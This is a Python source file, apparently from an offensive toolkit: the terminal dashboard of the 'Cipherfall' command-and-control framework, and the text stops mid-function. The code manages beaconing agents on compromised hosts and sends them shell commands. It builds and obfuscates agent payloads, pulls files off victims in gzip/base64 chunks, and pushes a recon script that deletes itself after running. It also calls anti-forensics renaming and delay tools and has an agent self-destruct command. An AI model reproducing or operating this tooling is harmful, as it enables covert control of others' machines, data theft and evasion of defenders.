#!/usr/bin/env python3
"""
tui.py — Cipherfall C2 Terminal Dashboard (NullRelay / ClockVenom)

Two-tab interactive TUI:
  Agents  — list active agents, browse task history, dispatch commands.
            Agents auto-appear as soon as they beacon; no manual registration.
  Payload — bake cloudflare/agent.py or ntp/agent.py with custom settings
            (type, interval, jitter, PSK, worker URL) and optionally obfuscate.

Usage:
    python tui.py

Keys:
    Enter   select agent / task, submit command
    r       force refresh
    q       quit
"""

import asyncio, base64, gzip, json, os, pathlib, re, shutil, subprocess, sys, tempfile, time, uuid
from rich.markup import escape as _escape
from rich.text import Text
from dotenv import load_dotenv
from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.screen import ModalScreen
from textual.containers import Horizontal, Vertical, VerticalScroll
from textual.widgets import (
    Button, DataTable, Footer, Header, Input,
    Label, RichLog, Select, Static, Switch, TabbedContent, TabPane,
)
import httpx

load_dotenv(pathlib.Path(__file__).parent / ".env")

_ports       = os.environ.get("C2_ADMIN_PORTS",
                   os.environ.get("C2_ADMIN_PORT", "1338,1337")).split(",")
BASES        = [f"http://127.0.0.1:{p.strip()}" for p in _ports if p.strip()]
BASE         = BASES[0]
_DEFAULT_URL = os.environ.get("WORKER_URL", "").rstrip("/")
_C2_HOST     = os.environ.get("C2_HOST", "0.0.0.0")
_DEFAULT_PSK = os.environ.get("C2_PSK", "")
TASK_COLORS  = {"done": "green", "sent": "yellow", "pending": "red"}
HERE         = pathlib.Path(__file__).parent


def _ts(epoch: int) -> str:
    return time.strftime("%H:%M:%S", time.localtime(epoch))


def _ago(epoch: int) -> str:
    d = int(time.time()) - epoch
    if d < 60:   return f"{d}s"
    if d < 3600: return f"{d // 60}m"
    return f"{d // 3600}h"


def _patch_agent(src: str, psk: str, interval: int, jitter: int) -> str:
    src = re.sub(
        r'BEACON_INT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
        f'BEACON_INT = int(os.environ.get("C2_INT", "{interval}"))',
        src,
    )
    src = re.sub(
        r'JITTER\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
        f'JITTER     = int(os.environ.get("C2_JITTER", "{jitter}"))',
        src,
    )
    src = re.sub(
        r'C2_PSK\s*=\s*os\.environ\.get\([^)]+\)',
        f'C2_PSK     = os.environ.get("C2_PSK", "{psk}")',
        src,
    )
    return src


def _bake_agent_cloudflare(worker_url: str, psk: str, interval: int,
                            jitter: int, out_name: str,
                            relay_port: int = 0) -> pathlib.Path:
    src = (HERE / "cloudflare-worker" / "nullrelay.py").read_text(encoding="utf-8")
    src = re.sub(
        r'WORKER_URL\s*=\s*os\.environ\.get\([^)]+\)',
        f'WORKER_URL = os.environ.get("WORKER_URL", "{worker_url}")',
        src,
    )
    src = re.sub(
        r'PSK\s*=\s*os\.environ\.get\([^)]+\)',
        f'PSK        = os.environ.get("C2_PSK", "{psk}")',
        src,
    )
    src = re.sub(
        r'BEACON_INT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
        f'BEACON_INT = int(os.environ.get("C2_INT", "{interval}"))',
        src,
    )
    src = re.sub(
        r'JITTER\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
        f'JITTER     = int(os.environ.get("C2_JITTER", "{jitter}"))',
        src,
    )
    if relay_port:
        src = re.sub(
            r'RELAY_PORT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
            f'RELAY_PORT  = int(os.environ.get("C2_RELAY_PORT", "{relay_port}"))',
            src,
        )
    out = HERE / out_name
    out.write_text(src, encoding="utf-8")
    return out


def _bake_agent_ntp(psk: str, interval: int, jitter: int,
                    out_name: str, tcp_port: int = 443,
                    relay_host: str = "") -> pathlib.Path:
    ntp_agent = HERE / "ntp" / "clockvenom.py"
    if not ntp_agent.exists():
        raise FileNotFoundError(f"ntp agent not found: {ntp_agent}")
    src = _patch_agent(ntp_agent.read_text(encoding="utf-8"), psk, interval, jitter)
    src = re.sub(
        r'TCP_PORT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
        f'TCP_PORT         = int(os.environ.get("C2_TCP_PORT", "{tcp_port}"))',
        src,
    )
    src = re.sub(
        r'C2_DIRECT\s*=\s*os\.environ\.get\([^)]+\)',
        f'C2_DIRECT        = os.environ.get("C2_DIRECT", "{relay_host}")',
        src,
    )
    out = HERE / out_name
    out.write_text(src, encoding="utf-8")
    return out


def _obfuscate(agent_path: pathlib.Path) -> pathlib.Path:
    obf = HERE.parent / "Obfuscator" / "shadowscript.py"
    if not obf.exists():
        raise FileNotFoundError(f"obfuscator not found: {obf}")
    subprocess.run([sys.executable, str(obf), str(agent_path)], check=True)
    return agent_path.parent / (agent_path.stem + "_obf.py")



def _freshness_style(last_seen: int, beacon_int: int = 30) -> str:
    age = int(time.time()) - last_seen
    if age < beacon_int * 2:
        return "bright_green"
    if age < beacon_int * 5:
        return "yellow"
    return "red"


def _agent_line(t: Text, a: dict, info: dict, *, tag: str = "",
                relay_url: str = "", dead: bool = False) -> None:
    atype = "cf" if info.get("worker_url", "").startswith("http") else "ntp"
    bi    = info.get("beacon_int", 30)

    if dead:
        t.append("✗ ", style="dim red")
        t.append(f"{(a.get('label') or '—'):<14}", style="dim")
        t.append(f"[{a['id'][:8]}]", style="dim")
        t.append(f"  {'CF ' if atype == 'cf' else 'NTP'}", style="dim")
        t.append(f"  {info.get('user','?')}@{info.get('hostname','?')}", style="dim")
        t.append(f"  {_ago(a['last_seen'])}", style="dim red")
        return

    is_relay_node = tag == "RELAY"
    dot = "◆" if is_relay_node else "■"

    if is_relay_node:
        dot_s  = "yellow bold"
        type_s = "yellow bold"
    elif atype == "cf":
        dot_s  = "bright_cyan bold"
        type_s = "bright_cyan bold"
    else:
        dot_s  = "bright_yellow bold"
        type_s = "bright_yellow bold"

    type_l = " CF " if atype == "cf" else " NTP"

    t.append(f"{dot} ", style=dot_s)
    t.append(f"{(a.get('label') or '—'):<14}", style="bold white")
    t.append(f"[{a['id'][:8]}]", style="dim")
    t.append(f"  {type_l}", style=type_s)
    t.append(f"  {info.get('user','?')}@{info.get('hostname','?')}", style="dim white")
    if tag == "RELAY":
        t.append(f"  ⇄ RELAY :{info.get('relay_port','?')}", style="yellow bold")
    elif relay_url:
        t.append(f"  ↪ {relay_url}", style="dim cyan")
    t.append(f"  {_ago(a['last_seen'])}", style=_freshness_style(a["last_seen"], bi))


def _url_host(url: str) -> str:
    try:
        return url.split("://", 1)[1].rsplit(":", 1)[0]
    except Exception:
        return ""


def _build_graph(agents: list, worker_url: str, admin_port: str, c2_host: str = "127.0.0.1") -> Text:
    now  = int(time.time())
    wurl = worker_url.rstrip("/")
    t    = Text()

    dead: list        = []
    layer1: list      = []
    relay_by_host: dict = {}
    relay_by_port: dict = {}
    orphans: list     = []

    for a in agents:
        info = json.loads(a.get("sysinfo") or "{}")
        bi   = info.get("beacon_int", 30)
        if now - a["last_seen"] > max(bi * 5, 30):
            dead.append((a, info))
            continue
        rport = info.get("relay_port", 0)
        rhost = info.get("relay_host", "")
        awurl = info.get("worker_url", "").rstrip("/")
        ahost = _url_host(awurl)
        if rport > 0:
            idx = len(layer1)
            layer1.append((a, info, []))
            if rhost:
                relay_by_host[rhost] = idx
            relay_by_port[rport] = idx
        elif awurl == wurl or ahost == c2_host or not awurl:
            layer1.append((a, info, []))
        else:
            orphans.append((a, info, awurl))

    for a, info, awurl in orphans:
        ahost = _url_host(awurl)
        idx   = relay_by_host.get(ahost)
        if idx is None:
            try:
                aport = int(awurl.rsplit(":", 1)[1].split("/")[0])
                idx = relay_by_port.get(aport)
            except Exception:
                pass
        if idx is not None:
            layer1[idx][2].append((a, info, awurl))
        else:
            layer1.append((a, info, []))

    n_active = len(layer1)
    n_dead   = len(dead)
    BOX_W    = 52

    t.append("╭" + "─" * (BOX_W - 2) + "╮\n", style="bold cyan")
    t.append("│  ", style="bold cyan")
    t.append("◉  C2 SERVER", style="bold white")
    server_detail = f"  {c2_host}:{admin_port}"
    t.append(server_detail, style="dim cyan")
    pad = BOX_W - 2 - 2 - len("◉  C2 SERVER") - len(server_detail)
    t.append(" " * max(pad, 0))
    t.append("│\n", style="bold cyan")
    t.append("│  ", style="bold cyan")
    stat_str  = f"{n_active} active"
    dead_str  = f"  ·  {n_dead} offline" if n_dead else ""
    t.append(stat_str, style="bright_green" if n_active else "dim")
    t.append(dead_str, style="dim yellow" if n_dead else "dim")
    pad2 = BOX_W - 2 - 2 - len(stat_str) - len(dead_str)
    t.append(" " * max(pad2, 0))
    t.append("│\n", style="bold cyan")
    t.append("╰" + "─" * (BOX_W - 2) + "╯\n", style="bold cyan")

    if not layer1 and not dead:
        t.append("\n  no agents registered\n", style="dim")
        return t

    t.append("\n")

    n = len(layer1)
    for i, (a, info, children) in enumerate(layer1):
        is_last  = (i == n - 1)
        v_char   = " " if is_last else "│"
        p_char   = "└" if is_last else "├"
        is_relay = info.get("relay_port", 0) > 0
        link_s   = "yellow" if is_relay else "bright_cyan"

        t.append(f"{p_char}── ", style=link_s)
        _agent_line(t, a, info, tag="RELAY" if is_relay else "")
        t.append("\n")

        nc = len(children)
        for j, (ia, iinfo, awurl) in enumerate(children):
            is_last_c = j == nc - 1
            t.append(f"{v_char}   │\n", style="dim cyan")
            cp = "└" if is_last_c else "├"
            t.append(f"{v_char}   {cp}╌╌ ", style="dim cyan")
            _agent_line(t, ia, iinfo, relay_url=awurl)
            t.append("\n")

    if dead:
        t.append("\n")
        sep = "╌" * 14 + f" OFFLINE ({n_dead}) " + "╌" * 14
        t.append(sep + "\n", style="dim red")
        t.append("\n")
        for a, info in dead:
            t.append("  ")
            _agent_line(t, a, info, dead=True)
            t.append("\n")

    t.append("\n")
    t.append("  ◆ ", style="yellow bold")
    t.append("relay node", style="yellow")
    t.append("   ■ ", style="bright_cyan bold")
    t.append("CF", style="bright_cyan bold")
    t.append("   ■ ", style="bright_yellow bold")
    t.append("NTP", style="bright_yellow bold")
    t.append("   ✗ ", style="dim red")
    t.append("offline", style="dim white")

    return t


class ConfirmModal(ModalScreen):
    def __init__(self, message: str) -> None:
        super().__init__()
        self._message = message

    def compose(self) -> ComposeResult:
        with Vertical(id="confirm-box"):
            yield Static(self._message, id="confirm-msg")
            with Horizontal(id="confirm-btns"):
                yield Button("Delete", id="confirm-yes", variant="error")
                yield Button("Cancel", id="confirm-no",  variant="default")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        event.stop()
        self.dismiss(event.button.id == "confirm-yes")

    def on_key(self, event) -> None:
        if event.key == "escape":
            self.dismiss(False)


class GraphPane(Static):
    def update_graph(self, agents: list, ports: list | None = None) -> None:
        port_str = ",".join(ports or _ports)
        self.update(_build_graph(
            agents,
            _DEFAULT_URL,
            port_str,
            "127.0.0.1",
        ))


CSS = """
Screen { background: #0d1117; }

TabbedContent          { height: 1fr; }
TabbedContent > TabPane { padding: 0; height: 1fr; }

/* ── Agents tab ── */
#agents-layout { height: 1fr; }

#left {
    width: 52;
    border: solid #30363d;
    margin: 1 1 0 1;
}
#right {
    border: solid #30363d;
    margin: 1 1 0 0;
}

#agents-table { height: 1fr; }
#tasks-table  { height: 10; border-bottom: solid #30363d; }
#output-log   { height: 1fr; padding: 0 1; }

#cmd-input {
    margin: 1 1 1 1;
    border: solid #388bfd;
}

/* ── Payload tab ── */
#payload-outer {
    align: center top;
    padding: 2 4;
    height: 1fr;
}
#payload-inner {
    width: 72;
}
.form-row   { height: 3; margin-bottom: 1; }
.form-label { width: 14; color: #8b949e; content-align: right middle; padding-right: 2; }

#btn-generate  { width: 72; margin-top: 1; }
#payload-status { padding: 1 1; height: 3; }
#row-url { height: 3; margin-bottom: 1; }

/* ── Graphe tab ── */
#graph-scroll {
    height: 1fr;
    padding: 2 4;
}
GraphPane {
    height: auto;
}

/* ── Confirm modal ── */
ConfirmModal {
    align: center middle;
}
#confirm-box {
    width: 50;
    height: auto;
    border: solid #f85149;
    background: #161b22;
    padding: 1 2;
}
#confirm-msg {
    color: white;
    padding: 1 0;
    height: auto;
    background: transparent;
    text-align: center;
    width: 100%;
}
#confirm-btns {
    height: 3;
    align: center middle;
    margin-top: 1;
}
#confirm-btns Button {
    width: 14;
    margin: 0 1;
}

/* ── Shared ── */
Label {
    background: #161b22;
    color: #388bfd;
    text-style: bold;
    padding: 0 1;
    width: 100%;
}
.form-label {
    background: transparent;
    text-style: none;
    color: #8b949e;
    width: 14;
}
"""


class CipherfallTUI(App):
    TITLE = "CIPHERFALL C2"
    CSS   = CSS

    BINDINGS = [
        Binding("q", "quit",         "Quit"),
        Binding("r", "do_refresh",   "Refresh"),
        Binding("d", "delete_agent", "Delete agent"),
    ]

    _selected_agent: str | None = None
    _selected_task:  str | None = None
    _cmd_history: list[str] = []
    _history_idx: int = -1
    _agent_base: dict[str, str] = {}   # agent_id -> base URL
    _agents_data: dict[str, dict] = {}  # agent_id -> agent dict (includes sysinfo)
    _download_tasks:    dict[str, dict] = {}  # task_id -> {type, ...}
    _download_sessions: dict[str, dict] = {}  # session_id -> state
    _recon_tasks:       dict[str, dict] = {}  # task_id -> {type, agent_id, remote_path}
    _suicide_tasks:     dict[str, str]  = {}  # task_id -> agent_id

    # ── Layout ───────────────────────────────────────────────────────────────

    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)

        with TabbedContent():

            with TabPane("Agents", id="tab-agents"):
                with Vertical():
                    with Horizontal(id="agents-layout"):
                        with Vertical(id="left"):
                            yield Label(" AGENTS")
                            yield DataTable(id="agents-table", cursor_type="row",
                                            zebra_stripes=True)
                        with Vertical(id="right"):
                            yield Label(" TASKS")
                            yield DataTable(id="tasks-table", cursor_type="row",
                                            zebra_stripes=True)
                            yield Label(" OUTPUT")
                            yield RichLog(id="output-log", highlight=True, markup=True)
                    yield Input(placeholder="select an agent first", id="cmd-input")

            with TabPane("Graphe", id="tab-graph"):
                with VerticalScroll(id="graph-scroll"):
                    yield GraphPane(id="graph-pane")

            with TabPane("Payload", id="tab-payload"):
                with Vertical(id="payload-outer"):
                    with Vertical(id="payload-inner"):
                        yield Label(" PAYLOAD BUILDER")
                        with Horizontal(classes="form-row"):
                            yield Label("AGENT TYPE", classes="form-label")
                            yield Select(
                                [("cloudflare", "cloudflare"), ("ntp", "ntp")],
                                id="p-type", value="cloudflare",
                            )
                        with Horizontal(classes="form-row", id="row-url"):
                            yield Label("WORKER URL", classes="form-label")
                            yield Input(id="p-url", value=_DEFAULT_URL)
                        with Horizontal(classes="form-row"):
                            yield Label("C2 PSK", classes="form-label")
                            yield Input(id="p-psk", password=True, value=_DEFAULT_PSK)
                        with Horizontal(classes="form-row"):
                            yield Label("BEACON (s)", classes="form-label")
                            yield Input(id="p-int", value="30")
                        with Horizontal(classes="form-row"):
                            yield Label("JITTER (s)", classes="form-label")
                            yield Input(id="p-jitter", value="10")
                        with Horizontal(classes="form-row", id="row-relay"):
                            yield Label("VIA RELAY", classes="form-label")
                            yield Switch(id="p-relay", value=False)
                        with Horizontal(classes="form-row", id="row-relay-host"):
                            yield Label("RELAY HOST", classes="form-label")
                            yield Input(id="p-relay-host", placeholder="192.168.x.x")
                        with Horizontal(classes="form-row", id="row-relay-port"):
                            yield Label("RELAY PORT", classes="form-label")
                            yield Input(id="p-relay-port", value="443")
                        with Horizontal(classes="form-row"):
                            yield Label("OBFUSCATION", classes="form-label")
                            yield Switch(id="p-obf", value=True)
                        with Horizontal(classes="form-row"):
                            yield Label("OUTPUT FILE", classes="form-label")
                            yield Input(id="p-out", value="agent_payload.py")
                        yield Button("GENERATE PAYLOAD", id="btn-generate", variant="primary")
                        yield Static("", id="payload-status")

        yield Footer()

    # ── Lifecycle ────────────────────────────────────────────────────────────

    async def on_mount(self) -> None:
        self.query_one("#agents-table", DataTable).add_columns(
            "", "ID", "Label", "Last seen", "User@Host", "Pending"
        )
        self.query_one("#tasks-table", DataTable).add_columns(
            "ID", "Command", "Status", "Sent", "Received"
        )
        # relay switch shown for all agent types; host row only for NTP
        self.query_one("#row-relay").display      = True
        self.query_one("#row-relay-host").display = False
        self.query_one("#row-relay-port").display = False
        await self._load_agents()
        self.set_interval(5.0, self._load_agents)
        self.set_interval(5.0, self._collect_chunks)

    # ── Data ─────────────────────────────────────────────────────────────────

    async def _load_agents(self) -> None:
        if isinstance(self.screen, ModalScreen):
            return

        agents_by_id: dict[str, tuple] = {}   # id -> (agent, base)
        all_tasks: list = []

        async with httpx.AsyncClient() as c:
            for base in BASES:
                try:
                    ag_r  = await c.get(f"{base}/admin/agents", timeout=3)
                    tsk_r = await c.get(f"{base}/admin/tasks",  timeout=3)
                    for a in ag_r.json():
                        prev = agents_by_id.get(a["id"])
                        if not prev or a["last_seen"] > prev[0]["last_seen"]:
                            agents_by_id[a["id"]] = (a, base)
                    all_tasks.extend(tsk_r.json())
                except Exception:
                    pass

        if not agents_by_id:
            self._agents_data = {}
            self._agent_base  = {}
            self.query_one("#agents-table", DataTable).clear()
            return

        self._agent_base  = {aid: base for aid, (_, base) in agents_by_id.items()}
        self._agents_data = {aid: a    for aid, (a, _)    in agents_by_id.items()}
        agents = [a for a, _ in agents_by_id.values()]

        pending: dict[str, int] = {}
        for task in all_tasks:
            if task["status"] in ("pending", "sent"):
                pending[task["agent_id"]] = pending.get(task["agent_id"], 0) + 1

        t = self.query_one("#agents-table", DataTable)
        t.clear()
        for a in agents:
            info  = json.loads(a.get("sysinfo") or "{}")
            bi    = json.loads(a.get("sysinfo") or "{}").get("beacon_int", 30)
            alive = int(time.time()) - a["last_seen"] < max(bi * 5, 30)
            n     = pending.get(a["id"], 0)
            t.add_row(
                Text("●", style="green" if alive else "red"),
                a["id"][:8],
                a.get("label") or "—",
                _ago(a["last_seen"]),
                f"{info.get('user', '?')}@{info.get('hostname', '?')}",
                Text(str(n), style="yellow") if n else Text("—", style="dim"),
                key=a["id"],
            )

        if self._selected_agent:
            for i, row_key in enumerate(t.rows):
                if str(row_key.value) == self._selected_agent:
                    t.move_cursor(row=i, animate=False)
                    break

        try:
            self.query_one("#graph-pane", GraphPane).update_graph(agents)
        except Exception:
            pass

        if self._selected_agent:
            await self._load_tasks(self._selected_agent)

    async def _load_tasks(self, agent_id: str) -> None:
        base = self._agent_base.get(agent_id, BASE)
        try:
            async with httpx.AsyncClient() as c:
                r = await c.get(f"{base}/admin/tasks", timeout=3)
                tasks = [t for t in r.json() if t["agent_id"] == agent_id]
        except Exception:
            return

        t = self.query_one("#tasks-table", DataTable)
        t.clear()
        for task in tasks:
            cmd = task["command"]
            t.add_row(
                task["id"][:8],
                (cmd[:30] + "…") if len(cmd) > 30 else cmd,
                Text(task["status"], style=TASK_COLORS.get(task["status"], "white")),
                _ts(task["created_at"]),
                _ts(task["completed_at"]) if task.get("completed_at") else "—",
                key=task["id"],
            )

        if self._selected_task:
            await self._show_output(self._selected_task)

    async def _show_output(self, task_id: str) -> None:
        base = self._agent_base.get(self._selected_agent or "", BASE)
        try:
            async with httpx.AsyncClient() as c:
                r = await c.get(f"{base}/admin/result/{task_id}", timeout=3)
                task = r.json()
        except Exception:
            return

        log = self.query_one("#output-log", RichLog)
        log.clear()
        log.write(f"[bold cyan]$ {task['command']}[/bold cyan]")

        rc = self._recon_tasks.get(task_id)
        if rc and rc["type"] == "recon_write":
            out = task.get("output") or ""
            if "written" in out:
                rp       = rc["remote_path"]
                aid      = rc["agent_id"]
                base_url = self._agent_base.get(aid, BASE)
                exec_cmd = f"bash {rp}; rm -f {rp}"
                log.write(f"[yellow]upload done — launching recon…[/yellow]")
                try:
                    async with httpx.AsyncClient() as c:
                        r2 = await c.post(f"{base_url}/admin/task",
                                          json={"agent_id": aid, "command": exec_cmd},
                                          timeout=3)
                        res = r2.json()
                    self._recon_tasks[res["task_id"]] = {"type": "recon_exec", "agent_id": aid, "remote_path": rp}
                    self._selected_task = res["task_id"]
                    await self._load_tasks(aid)
                except Exception as e:
                    log.write(f"[red]exec dispatch error: {e}[/red]")
            elif out:
                log.write(f"[red]upload error: {_escape(out[:200])}[/red]")
            else:
                log.write("[dim]uploading script…[/dim]")
            return
        if rc and rc["type"] == "recon_exec":
            out = task.get("output") or ""
            if out:
                log.write(f"[green]{_escape(out.strip())}[/green]")
            else:
                log.write("[dim]running recon…[/dim]")
            return

        si = self._suicide_tasks.get(task_id)
        if si is not None:
            out = task.get("output") or ""
            if out:
                log.write(f"[red]{_escape(out.strip())}[/red]")
                if "[suicide: ok]" in out:
                    log.write("[yellow]agent dead — removing from DB…[/yellow]")
                    try:
                        base_url = self._agent_base.get(si, BASE)
                        async with httpx.AsyncClient() as c:
                            await c.delete(f"{base_url}/admin/agents/{si}", timeout=3)
                        if self._selected_agent == si:
                            self._selected_agent = None
                            self._selected_task  = None
                            self.query_one("#cmd-input", Input).placeholder = "select an agent first"
                        self.query_one("#tasks-table", DataTable).clear()
                        self.query_one("#agents-table", DataTable).clear()
                        await self._load_agents()
                    except Exception as e:
                        log.write(f"[red]DB cleanup error: {e}[/red]")
            else:
                log.write("[dim]waiting for suicide confirmation…[/dim]")
            return

        dl = self._download_tasks.get(task_id)
        if dl is None:
            if task.get("output"):
                log.write(_escape(task["output"]))
            else:
                log.write("[dim]waiting for output…[/dim]")
        elif dl["type"] == "direct":
            if task.get("output"):
                try:
                    data = base64.b64decode(task["output"].strip())
                    lp = pathlib.Path(dl["local_path"])
                    lp.parent.mkdir(parents=True, exist_ok=True)
                    lp.write_bytes(data)
                    log.write(f"[green]saved  {dl['remote_path']}  →  {dl['local_path']}  ({len(data)} bytes)[/green]")
                except Exception as e:
                    log.write(f"[red]decode error: {e}[/red]")
                    log.write(_escape(task["output"][:400]))
            else:
                log.write("[dim]waiting for output…[/dim]")
        elif dl["type"] == "count":
            session = self._download_sessions.get(dl["session_id"], {})
            if session.get("done"):
                log.write(f"[green]saved  {session['remote_path']}  →  {session['local_path']}  ({session.get('size', '?')} bytes)[/green]")
            elif session.get("queued"):
                got   = len(session["chunks"])
                total = session["total"]
                log.write(f"[yellow]downloading  {session['remote_path']}  ({got}/{total} chunks)[/yellow]")
            elif task.get("output"):
                try:
                    total = int(task["output"].strip())
                except ValueError:
                    log.write(f"[red]count error: {_escape(task['output'][:200])}[/red]")
                    return
                session["total"]  = total
                session["queued"] = True
                rp       = session["remote_path"]
                aid      = session["agent_id"]
                base_url = self._agent_base.get(aid, BASE)
                log.write(f"[yellow]queuing {total} chunk{'s' if total != 1 else ''} for {rp}…[/yellow]")
                for i in range(total):
                    chunk_cmd = (
                        f"python3 -c \"import gzip,base64; "
                        f"d=open('{rp}','rb').read(); "
                        f"b=base64.b64encode(gzip.compress(d,9,mtime=0)).decode(); "
                        f"print(b[{i*550}:{(i+1)*550}],end='')\""
                    )
                    try:
                        async with httpx.AsyncClient() as c:
                            r2 = await c.post(f"{base_url}/admin/task",
                                              json={"agent_id": aid, "command": chunk_cmd},
                                              timeout=3)
                            res = r2.json()
                        session["chunk_tasks"][i] = res["task_id"]
                        self._download_tasks[res["task_id"]] = {"type": "chunk", "session_id": dl["session_id"]}
                    except Exception as e:
                        log.write(f"[red]queue error chunk {i}: {e}[/red]")
                        session["queued"] = False
                        return
                await self._load_tasks(aid)
            else:
                log.write("[dim]waiting for output…[/dim]")
        elif dl["type"] == "chunk":
            session = self._download_sessions.get(dl["session_id"], {})
            if session.get("done"):
                log.write(f"[green]download complete: {session['remote_path']}[/green]")
            else:
                chunk_idx = next((i for i, tid in session.get("chunk_tasks", {}).items() if tid == task_id), "?")
                total     = session.get("total", "?")
                got       = len(session.get("chunks", {}))
                log.write(f"[yellow]chunk {chunk_idx}/{total}  ({got} received so far)[/yellow]")

    async def _collect_chunks(self) -> None:
        for session_id, session in list(self._download_sessions.items()):
            if session.get("done") or not session.get("queued") or not session.get("total"):
                continue
            total    = session["total"]
            agent_id = session["agent_id"]
            base_url = self._agent_base.get(agent_id, BASE)
            for idx in range(total):
                if idx in session["chunks"]:
                    continue
                task_id = session["chunk_tasks"].get(idx)
                if not task_id:
                    continue
                try:
                    async with httpx.AsyncClient() as c:
                        r = await c.get(f"{base_url}/admin/result/{task_id}", timeout=3)
                        t = r.json()
                    output = (t.get("output") or "").strip()
                    if output and not output.startswith("["):
                        session["chunks"][idx] = output
                except Exception:
                    pass
            if len(session["chunks"]) < total:
                continue
            b64_gz = "".join(session["chunks"][i] for i in range(total))
            try:
                data = gzip.decompress(base64.b64decode(b64_gz))
                lp = pathlib.Path(session["local_path"])
                lp.parent.mkdir(parents=True, exist_ok=True)
                lp.write_bytes(data)
                session["done"] = True
                session["size"] = len(data)
                if self._selected_task and (
                    self._download_tasks.get(self._selected_task, {}).get("session_id") == session_id
                ):
                    log = self.query_one("#output-log", RichLog)
                    log.clear()
                    log.write(f"[bold cyan]$ [download {session['remote_path']}][/bold cyan]")
                    log.write(f"[green]saved  {session['remote_path']}  →  {session['local_path']}  ({len(data)} bytes)[/green]")
            except Exception as e:
                session["done"]  = True
                session["error"] = str(e)

    # ── Events ───────────────────────────────────────────────────────────────

    async def on_data_table_row_selected(self, event: DataTable.RowSelected) -> None:
        tid = event.data_table.id
        if tid == "agents-table":
            self._selected_agent = str(event.row_key.value)
            self._selected_task  = None
            self.query_one("#cmd-input", Input).placeholder = \
                f"agent {self._selected_agent[:8]} — type a command and press Enter"
            await self._load_tasks(self._selected_agent)
        elif tid == "tasks-table":
            self._selected_task = str(event.row_key.value)
            await self._show_output(self._selected_task)

    def on_key(self, event) -> None:
        focused = self.focused
        if not (focused and getattr(focused, "id", None) == "cmd-input"):
            return
        inp = self.query_one("#cmd-input", Input)
        if event.key == "up":
            if not self._cmd_history:
                return
            self._history_idx = min(self._history_idx + 1, len(self._cmd_history) - 1)
            inp.value = self._cmd_history[self._history_idx]
            inp.cursor_position = len(inp.value)
            event.prevent_default()
        elif event.key == "down":
            if self._history_idx <= 0:
                self._history_idx = -1
                inp.value = ""
                return
            self._history_idx -= 1
            inp.value = self._cmd_history[self._history_idx]
            inp.cursor_position = len(inp.value)
            event.prevent_default()

    async def on_input_submitted(self, event: Input.Submitted) -> None:
        if event.input.id != "cmd-input":
            return
        cmd = event.value.strip()
        if not cmd or not self._selected_agent:
            return
        event.input.value = ""
        if not self._cmd_history or self._cmd_history[0] != cmd:
            self._cmd_history.insert(0, cmd)
            if len(self._cmd_history) > 100:
                self._cmd_history.pop()
        self._history_idx = -1
        log = self.query_one("#output-log", RichLog)
        _download_local  = ""
        _download_remote = ""
        _is_ntp          = False
        _recon_remote    = ""
        _recon_aid       = ""
        if cmd.startswith("/module upload"):
            parts = cmd.split(None, 3)
            if len(parts) < 3:
                log.clear()
                log.write("[red]usage: /module upload <local_path> [remote_path][/red]")
                return
            lp = pathlib.Path(parts[2]).expanduser()
            if not lp.exists():
                log.clear()
                log.write(f"[red]not found: {parts[2]}[/red]")
                return
            data = lp.read_bytes()
            rp = parts[3] if len(parts) > 3 else f"/tmp/{lp.name}"
            b64 = base64.b64encode(data).decode()
            cmd = f"WRITE:{rp}:{b64}"
        elif cmd.startswith("/module download"):
            parts = cmd.split(None, 3)
            if len(parts) < 3:
                log.clear()
                log.write("[red]usage: /module download <remote_path> [local_path][/red]")
                return
            _download_remote = parts[2]
            fname  = pathlib.Path(_download_remote).name or "download"
            dl_dir = HERE / "downloads"
            dl_dir.mkdir(exist_ok=True)
            _download_local = parts[3] if len(parts) > 3 else str(dl_dir / fname)
            a_data  = self._agents_data.get(self._selected_agent or "", {})
            info    = json.loads(a_data.get("sysinfo") or "{}")
            _is_ntp = info.get("worker_url", "").startswith("ntp://")
            if _is_ntp:
                rp  = _download_remote
                cmd = (f"python3 -c \"import gzip,base64; "
                       f"d=open('{rp}','rb').read(); "
                       f"b=base64.b64encode(gzip.compress(d,9,mtime=0)).decode(); "
                       f"print((len(b)+549)//550)\"")
            else:
                cmd = f"UPLOAD:{_download_remote}"
        elif cmd.startswith("/module recon"):
            parts        = cmd.split()
            do_obfuscate = "--obfuscate" in parts
            do_renamer   = "--renamer"   in parts
            delayer_fixed, delayer_jitter = "0.5", "0.2"
            do_delayer = "--delayer" in parts
            if do_delayer:
                di = parts.index("--delayer")
                try:
                    delayer_fixed  = parts[di + 1]
                    delayer_jitter = parts[di + 2]
                except IndexError:
                    log.clear()
                    log.write("[red]usage: /module recon [--obfuscate] [--delayer INT JITTER] [--renamer][/red]")
                    return
            pe_src   = HERE.parent / "Recon"          / "phantom_eye.sh"
            ss_path  = HERE.parent / "Obfuscator"     / "shadowscript.sh"
            del_path = HERE.parent / "Anti-forensics" / "echoerase_delayer.sh"
            ren_path = HERE.parent / "Anti-forensics" / "echoerase_renamer.py"
            if not pe_src.exists():
                log.clear()
                log.write(f"[red]not found: {pe_src}[/red]")
                return
            tmpdir = pathlib.Path(tempfile.mkdtemp())
            try:
                tmp = tmpdir / "phantom_eye.sh"
                shutil.copy(pe_src, tmp)
                if do_delayer:
                    log.write(f"[yellow]applying echoerase_delayer ({delayer_fixed}s ±{delayer_jitter}s)…[/yellow]")
                    r = subprocess.run(
                        ["bash", str(del_path), str(tmp), delayer_fixed, delayer_jitter],
                        capture_output=True, text=True
                    )
                    delayed = tmpdir / "phantom_eye_delayed.sh"
                    delayed.write_text(r.stdout)
                    tmp = delayed
                if do_obfuscate:
                    log.write("[yellow]applying shadowscript…[/yellow]")
                    subprocess.run(["bash", str(ss_path), str(tmp)], capture_output=True, cwd=str(tmpdir))
                    obf = tmp.with_name(tmp.stem + "_obfv2.sh")
                    if not obf.exists():
                        log.write("[red]shadowscript failed — sending unobfuscated[/red]")
                    else:
                        tmp = obf
                if do_renamer:
                    log.write("[yellow]applying echoerase_renamer…[/yellow]")
                    r = subprocess.run(
                        ["python3", str(ren_path), "--no-recover", "--ext", "--hide", str(tmp)],
                        capture_output=True, text=True
                    )
                    if "→" in r.stdout:
